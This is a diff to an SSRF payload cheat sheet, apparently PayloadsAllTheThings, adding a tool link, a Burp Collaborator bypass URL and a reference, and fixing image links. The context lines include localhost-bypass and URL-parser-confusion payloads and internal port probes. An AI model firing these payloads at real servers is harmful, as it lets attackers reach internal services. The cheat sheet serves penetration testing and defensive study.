@@ -48,6 +48,7 @@
 
 - [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
 - [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
+- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
 
 ## Payloads with localhost
 
@@ -114,6 +115,7 @@ http://0000::1:3128/ Squid
 ### Bypass localhost with a domain redirection
 
 ```powershell
+http://spoofed.burpcollaborator.net
 http://localtest.me
 http://customer1.app.localhost.my.company.127.0.0.1.nip.io
 http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
@@ -216,7 +218,7 @@ http://127.1.1.1:80:\@@127.2.2.2:80/
 http://127.1.1.1:80#\@127.2.2.2:80/
 ```
 
-![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/Images/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20Injection/Images/WeakParser.jpg)
+![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
 
 ## SSRF exploitation via URL Scheme
@@ -242,7 +244,7 @@ ssrf.php?url=http://127.0.0.1:80
 ssrf.php?url=http://127.0.0.1:443
 ```
 
-![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20Injection/Images/SSRF_stream.png)
+![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)
 
 The following URL scheme can be used to probe the network
 
@@ -629,3 +631,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
+- [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
